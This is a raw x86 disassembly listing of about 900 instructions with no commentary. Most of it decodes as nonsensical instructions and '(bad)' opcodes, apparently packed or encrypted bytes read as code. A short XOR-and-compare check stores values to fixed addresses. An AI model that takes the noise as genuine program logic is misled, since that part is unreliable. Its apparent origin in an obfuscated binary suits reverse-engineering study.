  40ea34:	adc    DWORD PTR [ecx],eax
  40ea36:	sbb    bh,BYTE PTR [edi+0x1c3aee99]
  40ea3c:	lahf   
  40ea3d:	rcr    DWORD PTR [edx+0x1a],1
  40ea40:	neg    BYTE PTR [eax-0x1e]
  40ea43:	mov    al,ds:0x84d32cb0
  40ea48:	pop    ebx
  40ea49:	mov    al,dh
  40ea4b:	xchg   ebx,eax
  40ea4c:	pop    eax
  40ea4d:	jge    0x40e9e0
  40ea4f:	xchg   esi,eax
  40ea50:	push   cs
  40ea51:	add    esi,esp
  40ea53:	sti    
  40ea54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea55:	mov    edi,0xfd4ea765
  40ea5a:	xor    BYTE PTR [ecx-0x6d],dh
  40ea5d:	inc    ebp
  40ea5e:	mov    ch,bl
  40ea60:	int3   
  40ea61:	scas   eax,DWORD PTR es:[edi]
  40ea62:	and    al,0x70
  40ea64:	jl     0x40ea7b
  40ea66:	mov    BYTE PTR [edi+edi*1-0x3b],bl
  40ea6a:	hlt    
  40ea6b:	pop    ss
  40ea6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea6d:	ins    DWORD PTR es:[edi],dx
  40ea6e:	aad    0x22
  40ea70:	sub    eax,0x6eb4f7e9
  40ea75:	jle    0x40ea39
  40ea77:	scas   al,BYTE PTR es:[edi]
  40ea78:	ror    DWORD PTR [ecx+0x39c47329],0x4
  40ea7f:	aam    0xe2
  40ea81:	adc    BYTE PTR [ebx*4-0x34b81952],ah
  40ea88:	dec    edx
  40ea89:	dec    esp
  40ea8a:	mov    edx,0x25efffa5
  40ea8f:	ret    0x5950
  40ea92:	cmc    
  40ea93:	pusha  
  40ea94:	xor    DWORD PTR [esi+0x55136afa],edi
  40ea9a:	dec    edx
  40ea9b:	bt     DWORD PTR [ebx-0x3b1607bb],ecx
  40eaa2:	pop    es
  40eaa3:	add    BYTE PTR [eax],al
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
  40eaba:	xor    eax,edi
  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0xd783fe94
  40ead0:	inc    ecx
  40ead1:	jle    0x40eada
  40ead3:	xchg   edi,eax
  40ead4:	lods   eax,DWORD PTR ds:[esi]
  40ead5:	jl     0x40eb53
  40ead7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40ea6a
  40eadc:	loope  0x40eabf
  40eade:	jnp    0x40eabe
  40eae0:	pop    edx
  40eae1:	(bad)  
  40eae4:	imul   ecx,DWORD PTR [edx+0x1eef68a6],0x2ac074eb
  40eaee:	lahf   
  40eaef:	int3   
  40eaf0:	mov    ch,0x68
  40eaf2:	icebp  
  40eaf3:	repz xlat BYTE PTR ds:[ebx]
  40eaf5:	pop    ebp
  40eaf6:	jmp    0x40eb1a
  40eaf8:	add    BYTE PTR [edi],bh
  40eafa:	jl     0x40eb20
  40eafc:	jg     0x40eb4b
  40eafe:	gs mov ah,0x38
  40eb01:	sub    al,0xec
  40eb03:	cmp    esp,DWORD PTR [esi]
  40eb05:	js     0x40eb0c
  40eb07:	sar    DWORD PTR [ecx-0x20f3fad1],0x73
  40eb0e:	ins    DWORD PTR es:[edi],dx
  40eb0f:	std    
  40eb10:	ret    
  40eb11:	js     0x40eb44
  40eb13:	jns    0x40eb70
  40eb15:	add    edi,DWORD PTR [ecx+0x8]
  40eb18:	xchg   esi,eax
  40eb19:	or     ah,dh
  40eb1b:	sub    ch,BYTE PTR [ebx-0x4e]
  40eb1e:	or     DWORD PTR [ecx+0x46c61159],edi
  40eb24:	fisttp QWORD PTR [ecx]
  40eb26:	inc    edx
  40eb27:	(bad)  
  40eb28:	imul   eax,DWORD PTR [esp+ecx*2-0x6d],0xffffff85
  40eb2d:	sub    ah,0x2f
  40eb30:	rol    DWORD PTR [edx-0x47],1
  40eb33:	test   BYTE PTR [esi+0x19b808f2],ch
  40eb39:	mov    cl,0xca
  40eb3b:	mov    ?,WORD PTR [eax]
  40eb3d:	test   BYTE PTR [bp+di],al
  40eb40:	call   0x5fae:0x2f8b58af
  40eb47:	xor    eax,0xbf233b70
  40eb4c:	adc    BYTE PTR [esi+0x3f],cl
  40eb4f:	sti    
  40eb50:	add    ebp,DWORD PTR [ecx-0x4917bc22]
  40eb56:	cld    
  40eb57:	pop    edx
  40eb58:	pop    edi
  40eb59:	push   cs
  40eb5a:	or     BYTE PTR [edx-0xced7e82],cl
  40eb60:	dec    edi
  40eb61:	xor    BYTE PTR [edi-0x1],ah
  40eb64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb65:	jbe    0x40eb02
  40eb67:	in     al,0x80
  40eb69:	inc    ecx
  40eb6a:	mov    DWORD PTR [ebx+0x3c],ecx
  40eb6d:	aaa    
  40eb6e:	jnp    0x40eba7
  40eb70:	dec    edi
  40eb71:	loop   0x40eb8b
  40eb73:	jecxz  0x40eb2a
  40eb75:	das    
  40eb76:	mov    eax,0xf1bec2bb
  40eb7b:	and    DWORD PTR [ecx+0x3d],edx
  40eb7e:	push   ecx
  40eb7f:	adc    ch,ch
  40eb81:	add    eax,0x7e7e8409
  40eb86:	scas   al,BYTE PTR es:[edi]
  40eb87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb88:	inc    esi
  40eb89:	push   esp
  40eb8a:	int3   
  40eb8b:	cs shl DWORD PTR fs:[ebp-0xa],0xdc
  40eb91:	sub    al,cl
  40eb93:	scas   al,BYTE PTR es:[edi]
  40eb94:	dec    ebp
  40eb95:	test   DWORD PTR [ebx],ebx
  40eb97:	dec    eax
  40eb98:	jnp    0x40eb83
  40eb9a:	add    BYTE PTR [edx+0x76fde598],ch
  40eba0:	fcomp  QWORD PTR [ecx]
  40eba2:	pop    ds
  40eba3:	mov    al,0x8d
  40eba5:	cld    
  40eba6:	icebp  
  40eba7:	add    BYTE PTR [ebx+0x358f7e20],bl
  40ebad:	push   ecx
  40ebae:	pop    ds
  40ebaf:	jl     0x40eb61
  40ebb1:	shl    eax,cl
  40ebb3:	jae    0x40ebf5
  40ebb5:	pop    ecx
  40ebb6:	shl    ah,0xfa
  40ebb9:	push   ecx
  40ebba:	mov    cl,0xb2
  40ebbc:	add    edi,DWORD PTR [ecx-0x79ebf5f7]
  40ebc2:	gs inc edx
  40ebc4:	ds ins BYTE PTR es:[edi],dx
  40ebc6:	sub    eax,0xdd2c3420
  40ebcb:	fimul  DWORD PTR [ebp+0x70]
  40ebce:	inc    esp
  40ebcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebd0:	and    eax,0x34f002e3
  40ebd5:	fiadd  WORD PTR [edx]
  40ebd7:	cmp    al,0x35
  40ebd9:	mov    esi,0xb5d7580a
  40ebde:	mov    esp,0x52f96ab6
  40ebe3:	add    eax,0x353a90e6
  40ebe8:	xchg   ebp,eax
  40ebe9:	cmp    BYTE PTR [esi],al
  40ebeb:	xlat   BYTE PTR ds:[ebx]
  40ebec:	dec    esp
  40ebed:	sbb    DWORD PTR [ecx],ebx
  40ebef:	mov    al,ds:0xe50e2b0a
  40ebf4:	fcmovnb st,st(7)
  40ebf6:	nop
  40ebf7:	sti    
  40ebf8:	into   
  40ebf9:	and    al,0x93
  40ebfb:	aas    
  40ebfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebfd:	test   dh,ah
  40ebff:	rcr    BYTE PTR [ebp-0x4e],0x92
  40ec03:	sub    cl,al
  40ec05:	cmp    eax,DWORD PTR [ecx+eax*1]
  40ec08:	in     eax,dx
  40ec09:	mov    al,ds:0xa5e1715d
  40ec0e:	xor    cl,BYTE PTR [esi-0x2c2b4df9]
  40ec14:	int    0x83
  40ec16:	aad    0x36
  40ec18:	mov    bl,0x84
  40ec1a:	push   ds
  40ec1b:	into   
  40ec1c:	inc    esp
  40ec1d:	ss mov ebp,0x670137bd
  40ec23:	arpl   WORD PTR [esi-0x108dc4b0],dx
  40ec29:	sbb    ah,BYTE PTR [edi+0x31c45bff]
  40ec2f:	sbb    al,cl
  40ec31:	cmp    esi,DWORD PTR [esi+edi*4]
  40ec34:	adc    al,0xeb
  40ec36:	or     eax,0x73b73058
  40ec3b:	rcr    DWORD PTR [ebx+0x5b],1
  40ec3e:	sti    
  40ec3f:	test   DWORD PTR [edi],ebx
  40ec41:	out    0x90,eax
  40ec43:	xchg   esp,eax
  40ec44:	dec    edi
  40ec45:	add    al,0x6a
  40ec47:	cmp    BYTE PTR [edx-0x609f3717],dh
  40ec4d:	in     al,dx
  40ec4e:	popf   
  40ec4f:	jp     0x40ec72
  40ec51:	xchg   esp,eax
  40ec52:	jnp    0x40ec81
  40ec54:	sub    eax,0x7282895d
  40ec59:	call   0xef77:0x3d6f1699
  40ec60:	hlt    
  40ec61:	out    dx,al
  40ec62:	popa   
  40ec63:	mov    BYTE PTR [ebx-0xfd973fe],ah
  40ec69:	jp     0x40ec2e
  40ec6b:	dec    ebp
  40ec6c:	das    
  40ec6d:	outs   dx,BYTE PTR ds:[esi]
  40ec6e:	adc    ebx,ebp
  40ec70:	test   DWORD PTR [eax+eax*4-0x624ebef7],esp
  40ec77:	pusha  
  40ec78:	push   0xffffffc0
  40ec7a:	outs   dx,DWORD PTR ds:[esi]
  40ec7b:	xchg   ebp,eax
  40ec7c:	and    BYTE PTR [ecx+ecx*1-0x47],al
  40ec80:	push   ds
  40ec81:	cdq    
  40ec82:	mov    ecx,0x14be4a31
  40ec87:	pop    edx
  40ec88:	adc    al,0x2f
  40ec8a:	in     eax,0xc3
  40ec8c:	ja     0x40ec28
  40ec8e:	xchg   BYTE PTR [ebx+edx*1+0x18],ch
  40ec92:	shl    BYTE PTR [ecx],cl
  40ec94:	push   eax
  40ec95:	shl    esp,cl
  40ec97:	stos   BYTE PTR es:[edi],al
  40ec98:	pop    DWORD PTR [eax]
  40ec9a:	xchg   ebx,eax
  40ec9b:	neg    DWORD PTR [eax-0x4ac6261e]
  40eca1:	ins    BYTE PTR es:[edi],dx
  40eca2:	pop    ebp
  40eca3:	sub    DWORD PTR [edi+eiz*1+0x1a],0x1f
  40eca8:	mov    dl,0x60
  40ecaa:	les    esi,FWORD PTR [ecx-0x588985a6]
  40ecb0:	enter  0x6c89,0x3f
  40ecb4:	and    al,0xf6
  40ecb6:	pop    esp
  40ecb7:	or     bl,ch
  40ecb9:	jo     0x40ec9f
  40ecbb:	xor    al,0xaf
  40ecbd:	fsub   QWORD PTR [eax+0x43]
  40ecc0:	jmp    0xd838924a
  40ecc5:	sub    esi,edx
  40ecc7:	and    al,BYTE PTR [eax+0x61d0340e]
  40eccd:	repnz es dec ebp
  40ecd0:	mov    ch,0x10
  40ecd2:	pop    ss
  40ecd3:	xchg   ecx,eax
  40ecd4:	fist   DWORD PTR ds:0xe096ba56
  40ecda:	cld    
  40ecdb:	out    dx,al
  40ecdc:	daa    
  40ecdd:	jmp    0xa9c01efc
  40ece2:	push   esp
  40ece3:	cmp    eax,0x1a11b694
  40ece8:	pop    ecx
  40ece9:	call   0x1991:0x91c2567b
  40ecf0:	mov    dl,0x0
  40ecf2:	mov    bh,0x59
  40ecf4:	sub    dl,dl
  40ecf6:	push   ebp
  40ecf7:	cmp    bl,ch
  40ecf9:	inc    esi
  40ecfa:	pop    ds
  40ecfb:	pop    esi
  40ecfc:	in     al,0xcf
  40ecfe:	sub    eax,0xa4adafdd
  40ed03:	jmp    0x8cdae0e0
  40ed08:	jnp    0x40ecec
  40ed0a:	jbe    0x40ed61
  40ed0c:	inc    edx
  40ed0d:	cld    
  40ed0e:	mov    esi,0x6e8e6ff2
  40ed13:	in     eax,dx
  40ed14:	sub    dh,BYTE PTR [eax-0x1c5c1019]
  40ed1a:	mov    bl,0xcf
  40ed1c:	cs leave 
  40ed1e:	jb     0x40ed46
  40ed20:	push   0xffffffe2
  40ed22:	jg     0x40eda0
  40ed24:	out    dx,al
  40ed25:	iret   
  40ed26:	scas   al,BYTE PTR es:[edi]
  40ed27:	fldcw  WORD PTR [ecx]
  40ed29:	retf   
  40ed2a:	push   ecx
  40ed2b:	(bad)  
  40ed2c:	push   ecx
  40ed2d:	imul   ecx,DWORD PTR [edx],0x98c16bbb
  40ed33:	pop    edi
  40ed34:	js     0x40ecfb
  40ed36:	mov    eax,ds:0x927f4bca
  40ed3b:	xor    BYTE PTR [eax-0x13d50332],ah
  40ed41:	pop    edx
  40ed42:	mov    ah,0xe8
  40ed44:	rcl    DWORD PTR [ecx+0x6488b370],1
  40ed4a:	and    ebp,DWORD PTR [eax-0x81609a0]
  40ed50:	fild   DWORD PTR [edi+ecx*8-0x2a24ba23]
  40ed57:	retf   0x7027
  40ed5a:	push   eax
  40ed5b:	sub    DWORD PTR [ebx+0x27b88082],0x98d4d681
  40ed65:	sbb    eax,0xb75c4a1a
  40ed6a:	stos   DWORD PTR es:[edi],eax
  40ed6b:	mov    DWORD PTR [eax],edi
  40ed6d:	sub    DWORD PTR [eax-0x3],edx
  40ed70:	or     al,0x6f
  40ed72:	sbb    bh,bh
  40ed74:	out    dx,eax
  40ed75:	cwde   
  40ed76:	adc    al,0xfc
  40ed78:	or     BYTE PTR [eax],ch
  40ed7a:	adc    eax,0xbdd10889
  40ed7f:	mov    ds:0x9faff7ac,eax
  40ed84:	mov    ebp,0x23ce782
  40ed89:	dec    eax
  40ed8a:	ins    BYTE PTR es:[edi],dx
  40ed8b:	mov    eax,0x56457b28
  40ed90:	out    0x1c,al
  40ed92:	dec    edi
  40ed93:	adc    al,0xbe
  40ed95:	sar    BYTE PTR [ebp-0x1d08eef2],0xeb
  40ed9c:	push   esp
  40ed9d:	adc    al,BYTE PTR [esi+0x31b0c31b]
  40eda3:	jb     0x40ed6c
  40eda5:	stc    
  40eda6:	push   esi
  40eda7:	ja     0x40edae
  40eda9:	clc    
  40edaa:	add    eax,0xaee533e8
  40edaf:	loope  0x40ee0e
  40edb1:	(bad)  
  40edb2:	adc    dl,BYTE PTR [ebp+eiz*1-0x5f]
  40edb6:	sub    edx,ebx
  40edb8:	daa    
  40edb9:	mov    bl,0x94
  40edbb:	sbb    bh,BYTE PTR [edi+0x20]
  40edbe:	mov    esp,0xdf2f884a
  40edc3:	out    0x42,eax
  40edc5:	jmp    0xbd11:0xe2a4
  40edcb:	xor    ebp,DWORD PTR ds:0x66186c69
  40edd1:	cmp    DWORD PTR [esi],ebx
  40edd3:	mov    eax,0xdd832401
  40edd8:	xor    DWORD PTR gs:[esi-0x5ff49a86],ecx
  40eddf:	loopne 0x40ee0f
  40ede1:	lahf   
  40ede2:	mov    bh,0x6c
  40ede5:	pop    ss
  40ede6:	out    0x2e,al
  40ede8:	push   ecx
  40ede9:	pop    edi
  40edea:	dec    ebp
  40edeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edec:	adc    BYTE PTR [ecx-0x31],cl
  40edef:	cmc    
  40edf0:	mov    ds:0xd94bcaf9,al
  40edf5:	outs   dx,DWORD PTR ds:[esi]
  40edf6:	push   edi
  40edf7:	enter  0x2eaa,0xb0
  40edfb:	outs   dx,BYTE PTR ds:[esi]
  40edfc:	iret   
  40edfd:	lods   eax,DWORD PTR ds:[esi]
  40edfe:	jae    0x40edef
  40ee00:	mov    ecx,DWORD PTR [edx-0x20922c59]
  40ee06:	push   0x38697597
  40ee0b:	cmp    ecx,ecx
  40ee0d:	push   0x3228cde6
  40ee12:	fs pop esi
  40ee14:	mov    esi,?
  40ee16:	or     BYTE PTR [ebx+0x39083c13],ah
  40ee1c:	adc    al,0x39
  40ee1e:	xor    DWORD PTR [edi],eax
  40ee20:	sub    ebx,esp
  40ee22:	retf   
  40ee23:	lahf   
  40ee24:	dec    ebp
  40ee25:	fdiv   DWORD PTR [ebp-0x724c2539]
  40ee2b:	nop
  40ee2c:	jp     0x40edf7
  40ee2e:	mov    edi,0x58fd892
  40ee33:	dec    ecx
  40ee34:	cmp    edi,DWORD PTR [di+0x4]
  40ee38:	popa   
  40ee39:	addr16 push ss
  40ee3b:	lea    ebx,[eax-0x4843152e]
  40ee41:	dec    ebp
  40ee42:	sbb    bl,bh
  40ee44:	cld    
  40ee45:	xchg   ecx,eax
  40ee46:	mov    bh,0x8e
  40ee48:	fbstp  TBYTE PTR [eax-0xd]
  40ee4b:	inc    esp
  40ee4c:	cmp    DWORD PTR [eax-0x19],edi
  40ee4f:	popa   
  40ee50:	std    
  40ee51:	pushf  
  40ee52:	xchg   ebp,esp
  40ee54:	fcom   QWORD PTR [eax]
  40ee56:	rol    BYTE PTR [ecx-0x4a78caf4],0xd5
  40ee5d:	cmp    eax,0x74d3ff3d
  40ee62:	xor    BYTE PTR [ecx+0x6b424422],bh
  40ee68:	jg     0x40edfd
  40ee6a:	mov    ebp,0x858b72b9
  40ee6f:	pushf  
  40ee70:	test   eax,0xb4267a1a
  40ee75:	imul   ebx,DWORD PTR [esi],0xffffffe5
  40ee78:	popf   
  40ee79:	xchg   ebx,eax
  40ee7a:	enter  0x8040,0xd9
  40ee7e:	pop    eax
  40ee7f:	aad    0x16
  40ee81:	fwait
  40ee82:	jl     0x40eedf
  40ee84:	mov    ds:0x413b9a,eax
  40ee89:	mov    eax,DWORD PTR [ebp-0x4]
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	dec    ebp
  40eea7:	sub    DWORD PTR ds:0x7ca93eeb,0x7c
  40eeae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeaf:	jns    0x40ef2d
  40eeb1:	jl     0x40ee82
  40eeb3:	dec    ebx
  40eeb4:	scas   eax,DWORD PTR es:[edi]
  40eeb5:	ret    
  40eeb6:	(bad)  
  40eeb7:	lock pop es
  40eeb9:	cmp    ah,BYTE PTR [eax+ebp*8+0x5a17518e]
  40eec0:	jl     0x40ee65
  40eec2:	adc    BYTE PTR [eax+0x60],bl
  40eec5:	mov    ah,0x5a
  40eec7:	push   bp
  40eec9:	stc    
  40eeca:	push   ss
  40eecb:	inc    esi
  40eecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eecd:	sub    edx,edi
  40eecf:	test   BYTE PTR [eax-0x38b98a7d],0x3
  40eed6:	jmp    0x40ee5b
  40eed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eed9:	sub    esp,DWORD PTR [ebx+edx*8-0x5d8f4d1f]
  40eee0:	jnp    0x40eeaa
  40eee2:	cmc    
  40eee3:	xor    al,0xa0
  40eee5:	mov    edi,0x74f021fd
  40eeea:	fsubr  st,st(4)
  40eeec:	fiadd  WORD PTR ds:0x6fa4228c
  40eef2:	iret   
  40eef3:	xchg   ebp,eax
  40eef4:	mov    DWORD PTR [edx],ecx
  40eef6:	pop    esi
  40eef7:	ret    0xcf79
  40eefa:	pop    edi
  40eefb:	fdivr  QWORD PTR [eax+edi*4+0x56]
  40eeff:	fst    DWORD PTR [esi]
  40ef01:	or     BYTE PTR [ebx+0x22ab89e6],ch
  40ef07:	push   ss
  40ef08:	stos   DWORD PTR es:[edi],eax
  40ef09:	mov    dl,0x95
  40ef0b:	dec    edx
  40ef0c:	xchg   BYTE PTR ds:0xdac712cb,dh
  40ef12:	push   es
  40ef13:	push   ebx
  40ef14:	out    dx,eax
  40ef15:	inc    ecx
  40ef16:	das    
  40ef17:	or     ebp,DWORD PTR [ebx+0x2e]
  40ef1a:	rcr    BYTE PTR [ebx+0x60],0xd9
  40ef1e:	retf   
  40ef1f:	pop    edx
  40ef20:	add    eax,0x450580e6
  40ef25:	ins    DWORD PTR es:[edi],dx
  40ef26:	(bad)  
  40ef27:	imul   BYTE PTR [ebx+0x52]
  40ef2a:	jecxz  0x40ef7c
  40ef2c:	xchg   esp,eax
  40ef2d:	xchg   BYTE PTR ds:0xded8e685,al
  40ef33:	dec    edx
  40ef34:	lods   al,BYTE PTR ds:[esi]
  40ef35:	dec    esp
  40ef36:	mov    ah,bh
  40ef38:	pop    ebx
  40ef39:	(bad)  
  40ef3b:	and    ch,BYTE PTR [edx+eiz*2+0x38]
  40ef3f:	and    DWORD PTR [ecx-0x12],0xeb685c7f
  40ef46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef47:	xor    DWORD PTR [edi+eax*2-0x57280cbb],ebp
  40ef4e:	ja     0x40ef24
  40ef50:	(bad)  
  40ef51:	xor    esp,DWORD PTR [ecx-0x73]
  40ef54:	aad    0xa5
  40ef56:	inc    edi
  40ef57:	and    dh,BYTE PTR [esi-0x2637eaae]
  40ef5d:	inc    eax
  40ef5e:	aam    0xb5
  40ef60:	cmp    bl,BYTE PTR [ebp+0x17c6a5d3]
  40ef66:	add    esp,DWORD PTR [ebp-0x5e]
  40ef69:	mov    al,ds:0xf187fa40
  40ef6e:	ins    DWORD PTR es:[edi],dx
  40ef6f:	dec    esp
  40ef70:	and    BYTE PTR [ecx-0x52e75ce1],ch
  40ef76:	cmp    al,0x1f
  40ef78:	rol    DWORD PTR [ebp+0x6534386d],1
  40ef7e:	fcmove st,st(1)
  40ef80:	out    0x86,al
  40ef82:	ss mov edi,fs
  40ef85:	add    edx,esp
  40ef87:	inc    ebp
  40ef88:	leave  
  40ef89:	push   eax
  40ef8a:	cmp    al,0xf4
  40ef8c:	mov    esp,0x765093c6
  40ef91:	or     bh,BYTE PTR ds:0xb9a9ac44
  40ef97:	cmp    eax,esi
  40ef99:	xchg   ecx,eax
  40ef9a:	xchg   esp,eax
  40ef9b:	jae    0x40efe4
  40ef9d:	popf   
  40ef9e:	mov    ebx,0x32a1ca5c
  40efa3:	(bad)  
  40efa5:	repz jmp 0x7aa9:0x4f6d586f
  40efad:	ds stos DWORD PTR es:[edi],eax
  40efaf:	aas    
  40efb0:	mov    eax,0x28550cec
  40efb5:	div    DWORD PTR [esi]
  40efb7:	mov    eax,ds:0x1a1e51a8
  40efbc:	icebp  
  40efbd:	je     0x40f009
  40efbf:	test   DWORD PTR [edi+0x661c2844],ecx
  40efc5:	mov    ah,0x79
  40efc7:	push   0x7157b84d
  40efcc:	mov    DWORD PTR [ebx+0x2ab2a3f3],ecx
  40efd2:	xchg   esp,eax
  40efd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efd4:	mov    ch,0xe7
  40efd6:	xor    ebx,DWORD PTR ds:0x9328f671
  40efdc:	sub    cl,ah
  40efde:	inc    ecx
  40efdf:	and    bl,BYTE PTR [eax-0x56c575d1]
  40efe5:	fidivr WORD PTR [edx]
  40efe7:	les    ebp,FWORD PTR [ebx+eax*4-0x6c423e67]
  40efee:	push   edx
  40efef:	mov    eax,ds:0xda72e829
  40eff4:	fstp   QWORD PTR [eax+ebx*4]
  40eff7:	ficomp DWORD PTR [eax]
  40eff9:	dec    ebx
  40effa:	dec    esi
  40effb:	in     al,0x9d
  40effd:	push   ds
  40effe:	je     0x40f071
  40f000:	in     al,0xa7
  40f002:	xor    DWORD PTR [eax+edi*8],edx
  40f005:	mov    ch,0x7c
  40f007:	and    BYTE PTR [eax-0x1e830b85],0x9d
  40f00e:	(bad)  
  40f00f:	ds jb  0x40eff5
  40f012:	bound  edx,QWORD PTR [edi-0x3a43e4a6]
  40f018:	sub    DWORD PTR [ebx-0x58dddf0],0xcd2df4bf
  40f022:	push   edx
  40f023:	sub    eax,ebx
  40f025:	ds stos DWORD PTR es:[edi],eax
  40f027:	mov    ecx,0xdafd87f3
  40f02c:	cmp    BYTE PTR [esi+0x3f6f646b],al
  40f032:	(bad)  
  40f033:	xchg   edi,eax
  40f034:	out    dx,al
  40f035:	or     DWORD PTR [edi-0x2d],esi
  40f038:	mov    ah,BYTE PTR [edi+0x49]
  40f03b:	mov    esi,0x491fdf52
  40f040:	dec    esp
  40f041:	(bad)  
  40f042:	fdiv   DWORD PTR [ebp+0x73]
  40f045:	adc    BYTE PTR [eax+0x1b],al
  40f048:	mul    DWORD PTR [ebx+ebp*1-0x24]
  40f04c:	inc    eax
  40f04d:	(bad)
  40f050:	nop
  40f051:	sbb    al,0xd4
  40f053:	dec    edx
  40f054:	call   0x9724a70b
  40f059:	popf   
  40f05a:	cmc    
  40f05b:	mov    ch,0xa2
  40f05d:	sbb    BYTE PTR [ecx],bl
  40f05f:	inc    esp
  40f060:	cmp    eax,0xc9bb451d
  40f065:	sub    ah,dh
  40f067:	mov    ah,0x70
  40f069:	dec    esp
  40f06a:	rol    ebp,cl
  40f06c:	push   ecx
  40f06d:	or     al,0xf1
  40f06f:	pusha  
  40f070:	std    
  40f071:	xlat   BYTE PTR ds:[ebx]
  40f072:	inc    ebx
  40f073:	scas   al,BYTE PTR es:[edi]
  40f074:	cdq    
  40f075:	into   
  40f076:	(bad)  
  40f077:	lock int 0xf9
  40f07a:	or     eax,0x2f0738c3
  40f07f:	cmp    DWORD PTR [esi+edx*4-0x1b],0xab0e3dd6
  40f087:	push   ebx
  40f088:	jne    0x40f036
  40f08a:	sbb    BYTE PTR [edi-0x5a],bl
  40f08d:	outs   dx,BYTE PTR ds:[esi]
  40f08e:	push   di
  40f090:	bound  esi,QWORD PTR [edx+0x4752c4e9]
  40f096:	scas   al,BYTE PTR es:[edi]
  40f097:	xchg   edx,eax
  40f098:	test   DWORD PTR [edi+0x170d4e64],esi
  40f09e:	pop    ebp
  40f09f:	and    bl,BYTE PTR [edx]
  40f0a1:	fild   WORD PTR [edi-0x3029c86c]
  40f0a7:	xor    esi,edx
  40f0a9:	mov    ebx,0xad356edc
  40f0ae:	push   ecx
  40f0af:	pop    ss
  40f0b0:	out    dx,eax
  40f0b1:	adc    eax,0x9730d8e3
  40f0b6:	out    0x24,al
  40f0b8:	adc    DWORD PTR [ebp+0x2ae50640],esi
  40f0be:	vxorps xmm4,xmm3,XMMWORD PTR [ecx-0x31]
  40f0c3:	sbb    al,BYTE PTR [esi+0x13]
  40f0c6:	and    ch,BYTE PTR [ecx]
  40f0c8:	or     ebx,DWORD PTR [ecx-0x2e43b055]
  40f0ce:	mov    eax,fs:0x4ca74a7d
  40f0d4:	jl     0x40f0ef
  40f0d6:	sti    
  40f0d7:	jecxz  0x40f134
  40f0d9:	jge    0x40f149
  40f0db:	push   ds
  40f0dc:	aas    
  40f0dd:	or     ecx,DWORD PTR [ecx-0x19058d23]
  40f0e3:	js     0x40f131
  40f0e5:	(bad)  
  40f0e6:	sbb    dh,BYTE PTR [ecx-0x4c]
  40f0e9:	jmp    0xcd28:0x8e62d2f9
  40f0f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0f1:	(bad)  
  40f0f2:	das    
  40f0f3:	(bad)  
  40f0f5:	xor    BYTE PTR [edi],dh
  40f0f7:	enter  0xcc54,0x6e
  40f0fb:	pop    ds
  40f0fc:	cwde   
  40f0fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0fe:	cli    
  40f0ff:	mov    ebx,0x9a1d4804
  40f104:	out    dx,al
  40f105:	outs   dx,BYTE PTR ds:[esi]
  40f106:	outs   dx,BYTE PTR ds:[esi]
  40f107:	dec    ebp
  40f108:	pop    eax
  40f109:	sbb    al,0x8d
  40f10b:	popf   
  40f10c:	imul   ebp,DWORD PTR [ecx-0x4c897d5b],0xffffffb9
  40f113:	cli    
  40f114:	fwait
  40f115:	or     ebp,ebx
  40f117:	mov    al,ds:0xa52d364f
  40f11c:	add    dl,BYTE PTR [edi-0x38]
  40f11f:	mov    ds:0x5520f056,al
  40f124:	inc    ebp
  40f125:	xor    edx,DWORD PTR [eax]
  40f127:	add    eax,0x6a17875a
  40f12c:	push   eax
  40f12d:	and    eax,0xf6be7996
  40f132:	mov    BYTE PTR [edi],dh
  40f134:	std    
  40f135:	mov    bl,0xa2
  40f137:	es into 
  40f139:	sub    eax,DWORD PTR [ebx-0x4d]
  40f13c:	shl    ebp,0x55
  40f13f:	inc    ebx
  40f140:	cmp    eax,0x6c263229
  40f145:	xor    eax,0x6679fa92
  40f14a:	cld    
  40f14b:	(bad)  
  40f14c:	push   ds
  40f14d:	push   esi
  40f14e:	out    0x40,al
  40f150:	(bad)  
  40f151:	ins    BYTE PTR es:[edi],dx
  40f152:	sti    
  40f153:	or     DWORD PTR [ecx-0x52797d10],edi
  40f159:	adc    dh,BYTE PTR [ecx+0x2b2f7cc0]
  40f15f:	mov    eax,0xa970cf1a
  40f164:	or     al,0xf
  40f167:	stc    
  40f168:	pop    edi
  40f169:	jnp    0x40f12b
  40f16b:	std    
  40f16c:	push   edx
  40f16d:	lods   eax,DWORD PTR ds:[esi]
  40f16e:	and    bh,BYTE PTR [esi]
  40f170:	mov    bl,0x60
  40f172:	lods   al,BYTE PTR ds:[esi]
  40f173:	cmp    eax,0x283f7d4c
  40f178:	sub    ecx,DWORD PTR [esi+0x45]
  40f17b:	ficomp WORD PTR ds:0xf2abfa
  40f181:	push   esi
  40f182:	add    DWORD PTR [eax+eiz*1],esp
  40f185:	push   esi
  40f186:	jae    0x40f19c
  40f188:	clc    
  40f189:	fdivp  st(6),st
  40f18b:	nop
  40f18c:	push   eax
  40f18d:	(bad)  
  40f18e:	push   ecx
  40f18f:	or     BYTE PTR [eax-0x23],dl
